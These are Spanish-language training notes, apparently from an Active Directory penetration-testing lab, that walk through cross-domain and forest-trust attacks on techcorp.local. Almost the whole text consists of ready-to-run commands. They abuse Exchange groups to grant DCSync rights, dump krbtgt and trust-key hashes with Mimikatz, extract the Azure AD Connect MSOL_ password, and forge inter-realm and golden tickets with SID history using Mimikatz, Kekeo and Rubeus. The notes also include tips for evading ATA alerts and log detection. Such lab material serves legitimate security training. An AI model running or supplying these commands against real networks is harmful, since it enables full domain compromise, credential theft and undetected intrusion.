# Cross Trust Attacks

- Ahora tenemos privilegios de administrador de dominio de acceso en el dominio us.techcorp.local.
- Analicemos los ataques a través de Domain Trusts y Forest trusts.

![images/Cross%20Trust%20Attacks/Untitled.png](images/Cross%20Trust%20Attacks/Untitled.png)

**Cross Domain Attacks – MS Exchange -Interesting Groups**

Enumeremos si tenemos grupos de intercambio en el dominio techcorp.local:

PowerView:

`Get-DomainGroup *exchange* -Domain techcorp.local`

AD Module:

`Get-ADGroup -Filter 'Name -like "*exchange*"' -Server techcorp.local`

**Cross Domain Attacks – MS Exchange -Organization Management**

Enumeremos la pertenencia al grupo de administración de la organización:

PowerView:

`Get-DomainGroupMember "Organization Management" -Domain techcorp.local`

AD Module:

`Get-ADGroupMember -Identity "Organization Management" -Server techcorp.local`

Si tenemos privilegios de 'administrador de intercambio', que es miembro de la Administración de la organización, podemos agregar un usuario al grupo 'Permisos de Windows de Exchange':

PowerView:

`$user = Get-DomainUser -Identity studentuser1
$group = Get-DomainGroup -Identity 'Exchange Windows Permissions' -Domain techcorp.local
Add-DomainGroupMember -Identity $group -Members $user -Verbose`

AD Module:

`$user = Get-ADUser -Identity studentuser1
$group = Get-ADGroup -Identity 'Exchange Windows Permissions' -Server techcorp.local
Add-ADGroupMember -Identity $group -Members $user -Verbose`

**Cross Domain Attacks – MS Exchange - Organization Management and Enterprise Windows Permissions**

Ahora, como studentuser1 (nueva sesión y después de un tiempo), simplemente podemos agregar los permisos para ejecutar DCSync. Esto es válido para cualquier usuario que forme parte del grupo de permisos de Windows Enterprise:

PowerView_dev:

`Add-DomainObjectAcl -TargetIdentity 'DC=techcorp,DC=local' -PrincipalIdentity 'us\studentuser1' -Rights DCSync -Verbose`

Y ejecutamos DCSync:

`Invoke-Mimikatz -Command '"lsadump::dcsync /user:techcorp\krbtgt /domain:techcorp.local"'`

**Cross Domain Attacks – MS Exchange -Exchange Trusted Subsystem**

Enumeremos la pertenencia al subsistema de confianza de Exchange en techcorp.local:

PowerView:

`Get-DomainGroupMember "Exchange Trusted Subsystem" -Domain techcorp.local`

ActiveDirectory module:

`Get-ADGroupMember -Identity "Exchange Trusted Subsystem" -Server techcorp.local`

Si tenemos privilegios de 'usuario de intercambio', que es miembro del Subsistema de confianza de Exchange, podemos agregar cualquier usuario al grupo DNSAdmins:

PowerView_dev:

`$user = Get-DomainUser -Identity studentuser1
$group = Get-DomainGroup -Identity 'DNSAdmins' -Domain techcorp.local
Add-DomainGroupMember -Identity $group -Members $user -Verbose`

ActiveDirectory module:

`$user = Get-ADUser -Identity studentuser1
$group = Get-ADGroup -Identity 'DNSAdmins' -Server techcorp.local
Add-ADGroupMember -Identity $group -Members $user -Verbose`

`**Cross Domain Attacks - Attacking Azure AD Integration**`

- Azure AD es un método popular para extender la administración de identidades desde AD local a las ofertas de Azure de Microsoft.
- Muchas empresas utilizan sus identidades de AD locales para acceder a las aplicaciones de Azure.
- "Una única identidad de usuario para la autenticación y autorización de todos los recursos, independientemente de la ubicación ... es una identidad híbrida".
- Un AD local se puede integrar con Azure AD mediante Azure AD Connect con los siguientes métodos:

    -Sincronización de hash de contraseña (PHS)

    -Autenticación de paso a través (PTA)

    -federación

- ¡Azure AD Connect se instala localmente y tiene una cuenta de privilegios elevados tanto en AD como en Azure AD!

Cross Domain Attacks - Attacking Azure AD

- Apuntemos a PHS.
- Comparte usuarios y sus hashes de contraseña desde AD local a Azure AD.
- Se crea un nuevo usuario MSOL_ que tiene
Derechos de sincronización (DCSync) en el dominio

![images/Cross%20Trust%20Attacks/Untitled%201.png](images/Cross%20Trust%20Attacks/Untitled%201.png)

Cross Domain Attacks - Attacking Azure AD Integration - PHS

- Enumere la cuenta PHS y el servidor donde está instalado AD Connect

PowerView: 

`Get-DomainUser -Identity "MSOL_*" -Domain techcorp.local`

ActiveDirectory module:

`Get-ADUser -Filter "samAccountName -like 'MSOL_*'" -Server techcorp.local -Properties * | select SamAccountName,Description | fl`

- Ya tenemos acceso administrativo a us-adconnect como helpdeskadmin.
- Con privilegios administrativos, si ejecutamos adconnect.ps1, podemos extraer las credenciales de la cuenta MSOL_ utilizada por AD Connect en texto sin cifrar

    `.\adconnect.ps1`

- Con la contraseña, podemos ejecutar comandos como MSOL_

    `runas /user:techcorp.local\MSOL_16fb75d0227d /netonly cmd`

- Y luego puede ejecutar el ataque DCSync:

    `Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'`

    `Invoke-Mimikatz -Command '"lsadump::dcsync /user:techcorp\krbtgt /domain:techcorp.local"'`

- Tenga en cuenta que debido a que AD Connect sincroniza los hash cada dos minutos, en un entorno empresarial, la cuenta MSOL_ se excluirá de herramientas como ATA. ¡Esto nos permitirá ejecutar DCSync sin alertas!

**Cross Domain Attacks – Forest Root**

- Los dominios del mismo bosque tienen una confianza bidireccional implícita con otros dominios. Existe una clave de confianza entre los dominios principal y secundario.
- Se puede abusar de SIDHistory de dos formas para aumentar los privilegios dentro de un bosque:
    - hash krbtgt del secundario
    - Trust tickets
- Toda la escalada de privilegios a techcorp.local que hemos visto hasta ahora necesita una configuración incorrecta. Estos están "funcionando según lo previsto".

![images/Cross%20Trust%20Attacks/Untitled%202.png](images/Cross%20Trust%20Attacks/Untitled%202.png)

![images/Cross%20Trust%20Attacks/Untitled%203.png](images/Cross%20Trust%20Attacks/Untitled%203.png)

Cross Domain Attacks – Child to Forest Root -Trust Key

- Entonces, lo que se requiere para falsificar tickets de confianza es, obviamente, la clave de confianza.
Busque la clave de confianza [In] del niño al padre.

    `Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName us-dc`

- Forjemos una TGT inter-reino:

    `Invoke-Mimikatz -Command '"kerberos::golden 
    /domain:us.techcorp.local /sid:S-1-5-21-210670787-
    2521448726-163245708 /sids:S-1-5-21-2781415573-
    3701854478-2406986946-519 
    /rc4:b59ef5860ce0aa12429f4f61c8e51979 
    /user:Administrator /service:krbtgt
    /target:techcorp.local
    /ticket:C:\AD\Tools\trust_tkt.kirbi"'`

    ![images/Cross%20Trust%20Attacks/Untitled%204.png](images/Cross%20Trust%20Attacks/Untitled%204.png)

- Obtenga un TGS para un servicio (CIFS a continuación) en el dominio de destino utilizando el ticket de confianza falsificado con Kekeo ([https://github.com/gentilkiwi/kekeo/](https://github.com/gentilkiwi/kekeo/)):

    `tgs::ask /tgt:C:\AD\Tools\trust_tkt.kirbi /service:CIFS/techcorp-dc.techcorp.local`

- También se pueden crear tickets para otros servicios (como HOST y RPCSS para WMI, HOST y HTTP para PowerShell Remoting y WinRM)
- Utilice el TGS para acceder al servicio de destino (es posible que deba utilizarlo dos veces).

    `misc::convert lsa TGS_Administrator@us.techcorp.local_krbtgt~TECHCORP.LOCAL@US.TECHCORP.LOCAL.kirbi`

    `ls \\techcorp-dc.techcorp.local\c$`

- Usando Rubeus:

    `.\Rubeus.exe asktgs /ticket:C:\AD\Tools\trust_tkt.kirbi /service:cifs/techcorp-dc.techcorp.local /dc:techcorpdc.techcorp.local /ptt`

    `ls \\techcorp-dc.techcorp.local\c$`

**Cross Domain Attacks – Child to Forest Root -krbtgt**

- Abusaremos del historial de SID una vez más

    `Invoke-Mimikatz -Command '"kerberos::golden 
    /user:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 
    /krbtgt:b0975ae49f441adc6b024ad238935af5 /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /ptt"'`

- En el comando anterior, la opción mimkatz "/ sids" establece de manera forzosa el historial de SID para el grupo de administración empresarial para us.techcorp.local, que es el grupo de administración empresarial forestal.
- Ahora podemos acceder a techcorp-dc como administrador:

    `ls \\techcorp-dc.techcorp.local\C$`

    `Enter-PSSession techcorp-dc.techcorp.local`

- Evite registros sospechosos mediante el grupo de controladores de dominio

    `Invoke-Mimikatz -Command '"kerberos::golden /user:us-dc$ /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /groups:516 
    /krbtgt:b0975ae49f441adc6b024ad238935af5 /sids:S-1-5-21-2781415573-3701854478-2406986946-516,S-1-5-9 /ptt"'`

    S-1-5-21-2578538781-2508153159-3419410681-516 – Domain Controllers

    S-1-5-9 – Enterprise Domain Controllers

    `Invoke-Mimikatz -Command '"lsadump::dcsync /user:techcorp\Administrator/domain:techcorp.local"'`